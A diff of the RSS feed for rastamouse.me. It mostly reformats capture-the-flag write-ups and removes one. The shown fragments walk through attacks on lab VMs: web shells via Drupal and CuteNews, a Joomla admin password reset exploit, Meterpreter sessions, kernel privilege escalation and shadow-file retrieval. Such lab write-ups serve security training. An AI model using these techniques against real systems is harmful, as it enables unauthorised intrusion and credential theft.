@@ -2,12 +2,26 @@
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
     <title>rastamouse.me</title>
-    <link>https://rastamouse.me/</link>
+    <link>https://rastamouse.me/index.xml</link>
     <description>Recent content on rastamouse.me</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
-    <lastBuildDate>Fri, 09 Sep 2016 00:00:00 +0000</lastBuildDate>
+    <lastBuildDate>Thu, 15 Dec 2016 00:00:00 +0000</lastBuildDate>
     <atom:link href="https://rastamouse.me/index.xml" rel="self" type="application/rss+xml" />
+    
+    <item>
+      <title>Pwning Automize Password Encryption</title>
+      <link>https://rastamouse.me/guff/2016/automize/</link>
+      <pubDate>Thu, 15 Dec 2016 00:00:00 +0000</pubDate>
+      
+      <guid>https://rastamouse.me/guff/2016/automize/</guid>
+      <description>&lt;p&gt;&lt;/p&gt;
+
+
+&lt;div style=&#34;position: relative; padding-bottom: 56.25%; padding-top: 30px; height: 0; overflow: hidden;&#34;&gt;
+  &lt;iframe src=&#34;//www.youtube.com/embed/9Lc2X1RjpZs&#34; style=&#34;position: absolute; top: 0; left: 0; width: 100%; height: 100%;&#34; allowfullscreen frameborder=&#34;0&#34;&gt;&lt;/iframe&gt;
+ &lt;/div&gt;</description>
+    </item>
     
     <item>
       <title>VulnOS: 2</title>
@@ -15,9 +29,9 @@
       <pubDate>Fri, 09 Sep 2016 00:00:00 +0000</pubDate>
       
       <guid>https://rastamouse.me/writeups/2016/vulnos-2/</guid>
-      <description>
+      <description>&lt;p&gt;Your assignment is to pentest a company website, get root of the system and read the final flag.&lt;/p&gt;
 
-&lt;p&gt;Your assignment is to pentest a company website, get root of the system and read the final flag.&lt;/p&gt;
+&lt;p&gt;&lt;/p&gt;
 
 &lt;pre&gt;&lt;code&gt;root@kali:~# nmap -n -A -p- 192.168.56.104
 
@@ -35,7 +49,7 @@ PORT     STATE SERVICE VERSION
 
 &lt;p&gt;We&amp;rsquo;ll check out port 80 first.&lt;/p&gt;
 
-&lt;h2 id=&#34;drupal:39268561588adc281b818541b0b30b2a&#34;&gt;Drupal&lt;/h2&gt;
+&lt;h2 id=&#34;drupal&#34;&gt;Drupal&lt;/h2&gt;
 
 &lt;p&gt;We follow the initial link to &lt;code&gt;/jabc&lt;/code&gt; with a Drupal installation (given away by the favicon and bits of meta data such as &lt;code&gt;&amp;lt;meta name=&amp;quot;Generator&amp;quot; content=&amp;quot;Drupal 7 (http://drupal.org)&amp;quot; /&amp;gt;&lt;/code&gt;).&lt;/p&gt;
 
@@ -81,7 +95,7 @@ PORT     STATE SERVICE VERSION
 &lt;/figure&gt;
 &lt;/div&gt;
 
-&lt;h2 id=&#34;sqli:39268561588adc281b818541b0b30b2a&#34;&gt;SQLi&lt;/h2&gt;
+&lt;h2 id=&#34;sqli&#34;&gt;SQLi&lt;/h2&gt;
 
 &lt;p&gt;I looked up OpenDocMan 1.2.7 in exploitdb to see if there was anything I could take advantage of.&lt;/p&gt;
 
@@ -318,7 +332,7 @@ Table: users
 +---------+---------------------------------------------------------+
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h2 id=&#34;webmin1980:39268561588adc281b818541b0b30b2a&#34;&gt;webmin1980&lt;/h2&gt;
+&lt;h2 id=&#34;webmin1980&#34;&gt;webmin1980&lt;/h2&gt;
 
 &lt;p&gt;I tried running this hash through &lt;code&gt;hashcat&lt;/code&gt;, with the brute force mode.&lt;/p&gt;
 
@@ -334,7 +348,7 @@ Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
 webmin1980       (webmin)
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h2 id=&#34;php-shell:39268561588adc281b818541b0b30b2a&#34;&gt;PHP Shell&lt;/h2&gt;
+&lt;h2 id=&#34;php-shell&#34;&gt;PHP Shell&lt;/h2&gt;
 
 &lt;p&gt;So now that I can log in as a Drupal admin, I can start poking around the backend (uh er).  If you explore the &lt;code&gt;Modules&lt;/code&gt; section, there&amp;rsquo;s one called &lt;code&gt;PHP filter&lt;/code&gt; which is currently unchecked.  It&amp;rsquo;s description is rather attractive:
 &lt;code&gt;Allows embedded PHP code/snippets to be evaluated.&lt;/code&gt;&lt;/p&gt;
@@ -376,7 +390,7 @@ OS          : Linux VulnOSv2 3.13.0-24-generic #47-Ubuntu SMP Fri May 2 23:31:42
 Meterpreter : php/linux
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h2 id=&#34;priv-esc:39268561588adc281b818541b0b30b2a&#34;&gt;Priv Esc&lt;/h2&gt;
+&lt;h2 id=&#34;priv-esc&#34;&gt;Priv Esc&lt;/h2&gt;
 
 &lt;p&gt;This turned out to be a rather simple task.  We can already see the kernel version: &lt;code&gt;3.13.0&lt;/code&gt;, and we know it&amp;rsquo;s Ubuntu.  We can quickly drop into a shell and find exactly which version:&lt;/p&gt;
 
@@ -442,8 +456,7 @@ Hope you enjoyed it.
 What do you think of A.I.?
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;p&gt;Thanks &lt;a href=&#34;https://twitter.com/@c4b3rw0lf&#34;&gt;c4b3rw0lf&lt;/a&gt; for taking the time to make this VM :)&lt;/p&gt;
-</description>
+&lt;p&gt;Thanks &lt;a href=&#34;https://twitter.com/@c4b3rw0lf&#34;&gt;c4b3rw0lf&lt;/a&gt; for taking the time to make this VM :)&lt;/p&gt;</description>
     </item>
     
     <item>
@@ -452,15 +465,19 @@ What do you think of A.I.?
       <pubDate>Sat, 21 May 2016 00:00:00 +0000</pubDate>
       
       <guid>https://rastamouse.me/writeups/2016/gibson/</guid>
-      <description>
+      <description>&lt;p&gt;&lt;/p&gt;
 
-&lt;h1 id=&#34;livestream:d26d6d8097e91d38cfe3a5de2f2a51ff&#34;&gt;Livestream&lt;/h1&gt;
+&lt;h1 id=&#34;livestream&#34;&gt;Livestream&lt;/h1&gt;
 
-&lt;p&gt;&lt;iframe src=&#34;https://player.twitch.tv/?video=v67731859&#34; frameborder=&#34;0&#34; scrolling=&#34;no&#34; height=&#34;448&#34; width=&#34;735&#34;&gt;&lt;/iframe&gt;&lt;a href=&#34;https://www.twitch.tv/rastamaus?tt_medium=live_embed&amp;tt_content=text_link&#34; target=&#34;_blank&#34; style=&#34;padding:2px 0px 4px; display:block; width:345px; font-weight:normal; font-size:10px;text-decoration:underline;&#34;&gt;Watch live video from RastaMaus on www.twitch.tv&lt;/a&gt;&lt;/p&gt;
 
-&lt;h1 id=&#34;writeup:d26d6d8097e91d38cfe3a5de2f2a51ff&#34;&gt;Writeup&lt;/h1&gt;
+&lt;div style=&#34;position: relative; padding-bottom: 56.25%; padding-top: 30px; height: 0; overflow: hidden;&#34;&gt;
+  &lt;iframe src=&#34;//www.youtube.com/embed/XHqZ0uplIQE&#34; style=&#34;position: absolute; top: 0; left: 0; width: 100%; height: 100%;&#34; allowfullscreen frameborder=&#34;0&#34;&gt;&lt;/iframe&gt;
+ &lt;/div&gt;
 
-&lt;h2 id=&#34;nmap:d26d6d8097e91d38cfe3a5de2f2a51ff&#34;&gt;nmap&lt;/h2&gt;
+
+&lt;h1 id=&#34;writeup&#34;&gt;Writeup&lt;/h1&gt;
+
+&lt;h2 id=&#34;nmap&#34;&gt;nmap&lt;/h2&gt;
 
 &lt;pre&gt;&lt;code&gt;root@kali:~# nmap -n -p- -sV 192.168.56.102
 
@@ -468,7 +485,7 @@ What do you think of A.I.?
 80/tcp open  http    Apache httpd 2.4.7
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h2 id=&#34;davinci:d26d6d8097e91d38cfe3a5de2f2a51ff&#34;&gt;davinci&lt;/h2&gt;
+&lt;h2 id=&#34;davinci&#34;&gt;davinci&lt;/h2&gt;
 
 &lt;p&gt;Opening the page in Iceweasel, we get a simple directory lising with &lt;code&gt;davinci.html&lt;/code&gt;.&lt;/p&gt;
 
@@ -482,7 +499,7 @@ What do you think of A.I.?
 &amp;lt;/body&amp;gt;
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h2 id=&#34;ssh:d26d6d8097e91d38cfe3a5de2f2a51ff&#34;&gt;SSH&lt;/h2&gt;
+&lt;h2 id=&#34;ssh&#34;&gt;SSH&lt;/h2&gt;
 
 &lt;p&gt;We can use &lt;code&gt;margo:god&lt;/code&gt; to establish an SSH session :)&lt;/p&gt;
 
@@ -502,7 +519,7 @@ User margo may run the following commands on gibson:
     (ALL) NOPASSWD: /usr/bin/convert
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h2 id=&#34;image-tragick:d26d6d8097e91d38cfe3a5de2f2a51ff&#34;&gt;Image Tragick&lt;/h2&gt;
+&lt;h2 id=&#34;image-tragick&#34;&gt;Image Tragick&lt;/h2&gt;
 
 &lt;p&gt;We&amp;rsquo;ll check the version first to make sure it is vulnerable.&lt;/p&gt;
 
@@ -517,7 +534,7 @@ Version: ImageMagick 6.7.7-10
 uid=0(root) gid=0(root) groups=0(root)
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h2 id=&#34;where-art-thou-flag:d26d6d8097e91d38cfe3a5de2f2a51ff&#34;&gt;Where art thou, flag?&lt;/h2&gt;
+&lt;h2 id=&#34;where-art-thou-flag&#34;&gt;Where art thou, flag?&lt;/h2&gt;
 
 &lt;p&gt;There&amp;rsquo;s no flag in &lt;code&gt;/root&lt;/code&gt;, so it looks like we&amp;rsquo;ll have to look at little deeper.&lt;/p&gt;
 
@@ -560,7 +577,7 @@ root@kali:~# file ftpserv.img
 ftpserv.img: DOS/MBR boot sector, FREE-DOS Beta 0.9 MBR; partition 1 : ID=0xe, active, start-CHS (0x0,1,1), end-CHS (0xf,15,63), startsector 63, 1048257 sectors
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h2 id=&#34;sleuthing:d26d6d8097e91d38cfe3a5de2f2a51ff&#34;&gt;Sleuthing&lt;/h2&gt;
+&lt;h2 id=&#34;sleuthing&#34;&gt;Sleuthing&lt;/h2&gt;
 
 &lt;p&gt;First, display the partition layout of the volume with &lt;code&gt;mmls&lt;/code&gt;&lt;/p&gt;
 
@@ -686,12 +703,11 @@ to host the CTF once more.
                                                               --Knightmare
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h2 id=&#34;shout-outs:d26d6d8097e91d38cfe3a5de2f2a51ff&#34;&gt;Shout outs&lt;/h2&gt;
+&lt;h2 id=&#34;shout-outs&#34;&gt;Shout outs&lt;/h2&gt;
 
 &lt;p&gt;Thanks &lt;code&gt;knightmare&lt;/code&gt; for the VM and the continued hints throughout the livestream :)&lt;/p&gt;
 
-&lt;p&gt;Thanks to everyone who stopped by for the livestream and particularly to those who posted in Twitch chat and the IRC channel.  Honourable mentions go to &lt;code&gt;rfc&lt;/code&gt;, &lt;code&gt;dqi&lt;/code&gt; and &lt;code&gt;superkojiman&lt;/code&gt;.&lt;/p&gt;
-</description>
+&lt;p&gt;Thanks to everyone who stopped by for the livestream and particularly to those who posted in Twitch chat and the IRC channel.  Honourable mentions go to &lt;code&gt;rfc&lt;/code&gt;, &lt;code&gt;dqi&lt;/code&gt; and &lt;code&gt;superkojiman&lt;/code&gt;.&lt;/p&gt;</description>
     </item>
     
     <item>
@@ -700,13 +716,11 @@ to host the CTF once more.
       <pubDate>Sat, 16 Apr 2016 00:00:00 +0000</pubDate>
       
       <guid>https://rastamouse.me/writeups/2016/simple/</guid>
-      <description>
-
-&lt;h3 id=&#34;simple-ctf:bec3ed8ba720b9073ab75abcf3ba5d97&#34;&gt;Simple CTF&lt;/h3&gt;
+      <description>&lt;h3 id=&#34;simple-ctf&#34;&gt;Simple CTF&lt;/h3&gt;
 
 &lt;p&gt;Simple CTF is a boot2root that focuses on the basics of web based hacking.  /root/flag.txt is your ultimate goal.&lt;/p&gt;
 
-&lt;h3 id=&#34;hints:bec3ed8ba720b9073ab75abcf3ba5d97&#34;&gt;Hints&lt;/h3&gt;
+&lt;h3 id=&#34;hints&#34;&gt;Hints&lt;/h3&gt;
 
 &lt;ul&gt;
 &lt;li&gt;Get a user shell by uploading a reverse shell and executing it.&lt;/li&gt;
@@ -714,7 +728,9 @@ to host the CTF once more.
 &lt;li&gt;There are 3 known privesc exploits that work. Some people have had trouble executing one of them unless it was over a reverse shell using a netcat listener.&lt;/li&gt;
 &lt;/ul&gt;
 
-&lt;h2 id=&#34;discovery:bec3ed8ba720b9073ab75abcf3ba5d97&#34;&gt;Discovery&lt;/h2&gt;
+&lt;p&gt;&lt;/p&gt;
+
+&lt;h2 id=&#34;discovery&#34;&gt;Discovery&lt;/h2&gt;
 
 &lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# nmap -n -p- -A 192.168.56.104
 
@@ -724,7 +740,7 @@ PORT   STATE SERVICE VERSION
 |_http-title: Please Login / CuteNews
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h2 id=&#34;shell:bec3ed8ba720b9073ab75abcf3ba5d97&#34;&gt;Shell&lt;/h2&gt;
+&lt;h2 id=&#34;shell&#34;&gt;Shell&lt;/h2&gt;
 
 &lt;p&gt;CuteNews 2.0.3 has an arbitary file upload vulnerability, in the avatar function of a registered user.  I first registered an account as &lt;code&gt;rasta:mouse&lt;/code&gt; and logged in.  Navigate to &lt;code&gt;Personal options&lt;/code&gt; and select the &lt;code&gt;Browse&lt;/code&gt; button to upload an avatar.&lt;/p&gt;
 
@@ -751,7 +767,7 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 $ 
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h2 id=&#34;priv-esc:bec3ed8ba720b9073ab75abcf3ba5d97&#34;&gt;Priv esc&lt;/h2&gt;
+&lt;h2 id=&#34;priv-esc&#34;&gt;Priv esc&lt;/h2&gt;
 
 &lt;p&gt;This VM is running Ubuntu 14.04.1, which has a kernel vulnerability that will take us straight to &lt;code&gt;root&lt;/code&gt;.&lt;/p&gt;
 
@@ -777,13 +793,12 @@ sh: 0: can&#39;t access tty; job control turned off
 root
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h2 id=&#34;flag:bec3ed8ba720b9073ab75abcf3ba5d97&#34;&gt;Flag&lt;/h2&gt;
+&lt;h2 id=&#34;flag&#34;&gt;Flag&lt;/h2&gt;
 
 &lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;# cat /root/flag.txt
 U wyn teh Interwebs!!1eleven11!!1!
 Hack the planet!
-&lt;/code&gt;&lt;/pre&gt;
-</description>
+&lt;/code&gt;&lt;/pre&gt;</description>
     </item>
     
     <item>
@@ -792,22 +807,22 @@ Hack the planet!
       <pubDate>Fri, 15 Apr 2016 19:14:56 +0100</pubDate>
       
       <guid>https://rastamouse.me/writeups/2016/fuku/</guid>
-      <description>
-
-&lt;h3 id=&#34;fuku-ctf:4620d038ef80856257f87c289da6c889&#34;&gt;Fuku CTF&lt;/h3&gt;
+      <description>&lt;h3 id=&#34;fuku-ctf&#34;&gt;Fuku CTF&lt;/h3&gt;
 
 &lt;p&gt;Fuku (pronounced &amp;ldquo;far queue&amp;rdquo;) CTF is designed to fuck with people.&lt;/p&gt;
 
 &lt;p&gt;There are a few flag.txt files to grab. The final one is in the /root/ directory. However, the ultimate goal is to get a root shell.&lt;/p&gt;
 
-&lt;h3 id=&#34;scenario:4620d038ef80856257f87c289da6c889&#34;&gt;Scenario&lt;/h3&gt;
+&lt;h3 id=&#34;scenario&#34;&gt;Scenario&lt;/h3&gt;
 
 &lt;p&gt;&amp;ldquo;Bull was pissed when you broke into his Minotaur box. He has taken precautions with another website that he is hosting, implementing IDS, whitelisting, and obfuscation techniques. He is now taunting hackers to try and hack him, believing himself to be safe. It is up to you to put him in his place.&amp;rdquo;&lt;/p&gt;
 
-&lt;h3 id=&#34;hints:4620d038ef80856257f87c289da6c889&#34;&gt;Hints&lt;/h3&gt;
+&lt;h3 id=&#34;hints&#34;&gt;Hints&lt;/h3&gt;
 
 &lt;p&gt;Some scripting will probably be needed to find a useful port.
 If the machine seems to go down after a while, it probably hasn&amp;rsquo;t. This CTF isn&amp;rsquo;t called Fuku for nothing!&lt;/p&gt;
+
+&lt;p&gt;&lt;/p&gt;
 
 &lt;p&gt;This VM was supremely fuckin annoying, as its IP address changes at regular intervals :)&lt;/p&gt;
 
@@ -902,7 +917,7 @@ total 256612
 
 &lt;p&gt;Reading the dump for port &lt;code&gt;13370&lt;/code&gt;, we can see this is an installation of Jooma.  We can hop over in a browser for confirmation, and we see a lovely Japanese Rick Roll rendition.&lt;/p&gt;
 
-&lt;h2 id=&#34;joomla:4620d038ef80856257f87c289da6c889&#34;&gt;Joomla&lt;/h2&gt;
+&lt;h2 id=&#34;joomla&#34;&gt;Joomla&lt;/h2&gt;
 
 &lt;p&gt;The version of Joomla installed is &lt;code&gt;1.5.0&lt;/code&gt;, which has a remote admin password change vulnerability.  So we can navigate to &lt;code&gt;/index.php?option=com_user&amp;amp;view=reset&amp;amp;layout=confirm&lt;/code&gt;, pop a &lt;code&gt;&#39;&lt;/code&gt; in the text box and we&amp;rsquo;re free to set any new password we wish.&lt;/p&gt;
 
@@ -933,7 +948,7 @@ haha! FUKU! Only root can run that command.
 
 &lt;p&gt;It seems there&amp;rsquo;s some limitation going on with what commands we can run, which might get interesting.&lt;/p&gt;
 
-&lt;h2 id=&#34;flag-1:4620d038ef80856257f87c289da6c889&#34;&gt;Flag 1&lt;/h2&gt;
+&lt;h2 id=&#34;flag-1&#34;&gt;Flag 1&lt;/h2&gt;
 
 &lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;$ cat /var/www/html/flag.txt
 Did you find this flag by guessing? Or possibly by looking in the robots.txt file?
@@ -941,7 +956,7 @@ Maybe you found it after getting a shell, by using a command like &amp;quot;find
 Random keyboard smash: J7&amp;amp;fVbh2kTy[JgS&amp;quot;98$vF4#;&amp;gt;mGcT
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h2 id=&#34;priv-esc:4620d038ef80856257f87c289da6c889&#34;&gt;Priv Esc&lt;/h2&gt;
+&lt;h2 id=&#34;priv-esc&#34;&gt;Priv Esc&lt;/h2&gt;
 
 &lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;$ ps aux
 root      1442  0.0  0.5   5732  2744 ?        S    04:24   0:00 /bin/bash /root/chkrootkit-0.49/run_chkrootkit
@@ -968,8 +983,7 @@ ls -l
 cat flag.txt
 Yep, this is a flag. It&#39;s worth over 9000 Internet points!
 Random keyboard smash: lkhI6u%RdFEtDjJKIuuiI7i&amp;amp;*iuGf)8$d4gfh%4
-&lt;/code&gt;&lt;/pre&gt;
-</description>
+&lt;/code&gt;&lt;/pre&gt;</description>
     </item>
     
     <item>
@@ -978,20 +992,20 @@ Random keyboard smash: lkhI6u%RdFEtDjJKIuuiI7i&amp;amp;*iuGf)8$d4gfh%4
       <pubDate>Fri, 15 Apr 2016 00:00:00 +0000</pubDate>
       
       <guid>https://rastamouse.me/writeups/2016/minotaur/</guid>
-      <description>
-
-&lt;h3 id=&#34;minotaur-ctf:130852a9ee39e601e939903b24e77be6&#34;&gt;Minotaur CTF&lt;/h3&gt;
+      <description>&lt;h3 id=&#34;minotaur-ctf&#34;&gt;Minotaur CTF&lt;/h3&gt;
 
 &lt;p&gt;Minotaur is a boot2root CTF. There are a few flag.txt files around to grab. /root/flag.txt is your ultimate goal.&lt;/p&gt;
 
-&lt;h3 id=&#34;hints:130852a9ee39e601e939903b24e77be6&#34;&gt;Hints&lt;/h3&gt;
+&lt;h3 id=&#34;hints&#34;&gt;Hints&lt;/h3&gt;
 
 &lt;ul&gt;
 &lt;li&gt;This CTF has a couple of fairly heavy password cracking challenges, and some red herrings.&lt;/li&gt;
 &lt;li&gt;One password you will need is not on rockyou.txt or any other wordlist you may have out there. So you need to think of a way to generate it yourself.&lt;/li&gt;
 &lt;/ul&gt;
 
-&lt;h2 id=&#34;enumeration:130852a9ee39e601e939903b24e77be6&#34;&gt;Enumeration&lt;/h2&gt;
+&lt;p&gt;&lt;/p&gt;
+
+&lt;h2 id=&#34;enumeration&#34;&gt;Enumeration&lt;/h2&gt;
 
 &lt;p&gt;After spinning up the VM and doing an ARP scan, we find it at &lt;code&gt;192.168.56.223&lt;/code&gt;.  A port scan shows 3 ports available:&lt;/p&gt;
 
@@ -1036,7 +1050,7 @@ ID	Response   Lines      Word         Chars          Request
 &lt;/figure&gt;
 &lt;/div&gt;
 
-&lt;h2 id=&#34;wordpress:130852a9ee39e601e939903b24e77be6&#34;&gt;Wordpress&lt;/h2&gt;
+&lt;h2 id=&#34;wordpress&#34;&gt;Wordpress&lt;/h2&gt;
 
 &lt;p&gt;&lt;code&gt;wpscan&lt;/code&gt; is my defacto tool for scanning Wordpress.  &lt;code&gt;root@kali:~# wpscan -u http://192.168.56.223/bull/&lt;/code&gt;&lt;/p&gt;
 
@@ -1072,7 +1086,7 @@ root@kali:~/minotaur# wc -l bulls
 
 &lt;p&gt;I manually logged in just to make sure they worked, and I also noted that this was an admin account (which was fairly predictable due to its ID).  But it does mean that we don&amp;rsquo;t actually need to exploit the Slideshow Gallery vulnerability, as we can just upload a PHP Shell via this admin panel.&lt;/p&gt;
 
-&lt;h2 id=&#34;shell:130852a9ee39e601e939903b24e77be6&#34;&gt;Shell&lt;/h2&gt;
+&lt;h2 id=&#34;shell&#34;&gt;Shell&lt;/h2&gt;
 
 &lt;p&gt;I&amp;rsquo;ll just use the &lt;code&gt;exploit/unix/webapp/wp_admin_shell_upload&lt;/code&gt; Metasploit module for this.&lt;/p&gt;
 
@@ -1095,7 +1109,7 @@ OS          : Linux minotaur 3.16.0-30-generic #40~14.04.1-Ubuntu SMP Thu Jan 15
 Meterpreter : php/php
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h2 id=&#34;flag-1:130852a9ee39e601e939903b24e77be6&#34;&gt;Flag 1&lt;/h2&gt;
+&lt;h2 id=&#34;flag-1&#34;&gt;Flag 1&lt;/h2&gt;
 
 &lt;p&gt;The VM description told us that there are multiple flags, the first of which is found in the webroot.&lt;/p&gt;
 
@@ -1104,7 +1118,7 @@ Oh, lookey here. A flag!
 Th15 15 @N 3@5y f1@G!
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h2 id=&#34;flag-2:130852a9ee39e601e939903b24e77be6&#34;&gt;Flag 2&lt;/h2&gt;
+&lt;h2 id=&#34;flag-2&#34;&gt;Flag 2&lt;/h2&gt;
 
 &lt;p&gt;The second flag is found in the &lt;code&gt;/tmp&lt;/code&gt; directory, along with a priv-esc opportunity.&lt;/p&gt;
 
@@ -1119,7 +1133,7 @@ Also, you found a flag!
 My m1L|&amp;lt;$|-|@|&amp;lt;3 br1|\|G$ @11 t3h b0y$ 2 t3h y@R|)
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h2 id=&#34;root:130852a9ee39e601e939903b24e77be6&#34;&gt;root&lt;/h2&gt;
+&lt;h2 id=&#34;root&#34;&gt;root&lt;/h2&gt;
 
 &lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;meterpreter &amp;gt; download /tmp/shadow.bak
 [*] downloading: /tmp/shadow.bak -&amp;gt; shadow.bak
@@ -1181,7 +1195,7 @@ minotaur@minotaur:~$ sudo -i
 root@minotaur:~# 
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h2 id=&#34;final-flag:130852a9ee39e601e939903b24e77be6&#34;&gt;Final Flag&lt;/h2&gt;
+&lt;h2 id=&#34;final-flag&#34;&gt;Final Flag&lt;/h2&gt;
 
 &lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@minotaur:~# ls -l
 -rw------- 1 root root   70 May 27  2015 flag.txt
@@ -1191,346 +1205,7 @@ drwxr-xr-x 4 root root 4096 May 27  2015 peda
 root@minotaur:~# cat flag.txt 
 Congrats! You got the final flag!
 Th3 Fl@g is: 5urr0nd3d bY @r$3h0l35
-&lt;/code&gt;&lt;/pre&gt;
-</description>
-    </item>
-    
-    <item>
-      <title>SickOs 1.1</title>
-      <link>https://rastamouse.me/writeups/2015/sickos-1-1/</link>
-      <pubDate>Sat, 12 Dec 2015 00:00:00 +0000</pubDate>
-      
-      <guid>https://rastamouse.me/writeups/2015/sickos-1-1/</guid>
-      <description>
-
-&lt;p&gt;This VM was made by some chap called &lt;a href=&#34;https://twitter.com/D4rk36&#34;&gt;D4rk&lt;/a&gt;. His description:  This CTF gives a clear analogy how hacking strategies can be performed on a network to compromise it in a safe environment. This vm is very similar to labs I faced in OSCP. The objective being to compromise the network/machine and gain Administrative/root privileges on them.&lt;/p&gt;
-
-&lt;p&gt;So without further ado&amp;hellip;&lt;/p&gt;
-
-&lt;h2 id=&#34;port-scan:99a1d37ca1e2b0e17a0eda41f22eb05a&#34;&gt;Port Scan&lt;/h2&gt;
-
-&lt;p&gt;As always, smash it with &lt;code&gt;nmap&lt;/code&gt; :)&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# nmap -n -p- -A 192.168.50.105
-
-PORT     STATE  SERVICE    VERSION
-22/tcp   open   ssh        OpenSSH 5.9p1 Debian 5ubuntu1.1 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
-|   1024 09:3d:29:a0:da:48:14:c1:65:14:1e:6a:6c:37:04:09 (DSA)
-|   2048 84:63:e9:a8:8e:99:33:48:db:f6:d5:81:ab:f2:08:ec (RSA)
-|_  256 51:f6:eb:09:f6:b3:e6:91:ae:36:37:0c:c8:ee:34:27 (ECDSA)
-3128/tcp open   http-proxy Squid http proxy 3.1.19
-|_http-server-header: squid/3.1.19
-|_http-title: ERROR: The requested URL could not be retrieved
-8080/tcp closed http-proxy
-
-MAC Address: 08:00:27:17:00:0D (Oracle VirtualBox virtual NIC)
-Running: Linux 3.X|4.X
-OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
-OS details: Linux 3.2 - 4.0
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;My first assumption was that I should attempt to connect to port &lt;code&gt;8080&lt;/code&gt;, via the Squid Proxy on &lt;code&gt;3128&lt;/code&gt;.  So I tried to manually connect using the HTTP CONNECT method.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# nc 192.168.50.105 3128
-CONNECT 127.0.0.1:8080 HTTP/1.0
-
-HTTP/1.0 403 Forbidden
-Server: squid/3.1.19
-Mime-Version: 1.0
-Date: Sat, 12 Dec 2015 13:49:09 GMT
-Content-Type: text/html
-Content-Length: 3020
-X-Squid-Error: ERR_ACCESS_DENIED 0
-Vary: Accept-Language
-Content-Language: en
-X-Cache: MISS from localhost
-X-Cache-Lookup: NONE from localhost:3128
-Via: 1.0 localhost (squid/3.1.19)
-Connection: close
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;It seems that maybe there is an ACL in place, which stops us from accessing some ports.  We can connect port 22 via the proxy just fine, but not others.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# nc 192.168.50.105 3128
-CONNECT 127.0.0.1:22 HTTP/1.0
-
-HTTP/1.0 200 Connection established
-
-SSH-2.0-OpenSSH_5.9p1 Debian-5ubuntu1.1
-
-Protocol mismatch.
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;I tried using the &lt;code&gt;nmap --proxy&lt;/code&gt; option, but it didn&amp;rsquo;t return any open or closed ports for me.  Whilst I was moaning, &lt;a href=&#34;https://twitter.com/Arr0way&#34;&gt;Arr0way&lt;/a&gt; pointed out that there was an MSF module that I could try instead.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;msf &amp;gt; use auxiliary/scanner/http/squid_pivot_scanning
-
-Module options (auxiliary/scanner/http/squid_pivot_scanning):
-
-   Name          Current Setting                                  Required  Description
-   ----          ---------------                                  --------  -----------
-   CANARY_IP     1.2.3.4                                          yes       The IP to check if the proxy always answers positively; the IP should not respond.
-   MANUAL_CHECK  true                                             yes       Stop the scan if server seems to answer positively to every request
-   PORTS         21,80,139,443,445,1433,1521,1723,3389,8080,9100  yes       Ports to scan; must be TCP
-   Proxies                                                        no        A proxy chain of format type:host:port[,type:host:port][...]
-   RANGE         127.0.0.1                                        yes       IPs to scan through Squid proxy
-   RHOSTS        192.168.50.105                                   yes       The target address range or CIDR identifier
-   RPORT         3128                                             yes       The target port
-   THREADS       1000                                             yes       The number of concurrent threads
-   VHOST                                                          no        HTTP server virtual host
-
-msf auxiliary(squid_pivot_scanning) &amp;gt; run 
-
-[+] [192.168.50.105] 127.0.0.1 is alive but 21 is CLOSED
-[+] [192.168.50.105] 127.0.0.1:80 seems OPEN
-[+] [192.168.50.105] 127.0.0.1 is alive but 139 is CLOSED
-[+] [192.168.50.105] 127.0.0.1 is alive but 445 is CLOSED
-[+] [192.168.50.105] 127.0.0.1 is alive but 1433 is CLOSED
-[+] [192.168.50.105] 127.0.0.1 is alive but 1521 is CLOSED
-[+] [192.168.50.105] 127.0.0.1 is alive but 1723 is CLOSED
-[+] [192.168.50.105] 127.0.0.1 is alive but 3389 is CLOSED
-[+] [192.168.50.105] 127.0.0.1 is alive but 8080 is CLOSED
-[+] [192.168.50.105] 127.0.0.1 is alive but 9100 is CLOSED
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;This worked a lot better as port 80 looked open.  I used &lt;code&gt;cURL&lt;/code&gt;, along with its proxy option to try and talk to the web service.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# curl -v http://127.0.0.1 -x http://192.168.50.105:3128
-* Rebuilt URL to: http://127.0.0.1/
-* Hostname was NOT found in DNS cache
-*   Trying 192.168.50.105...
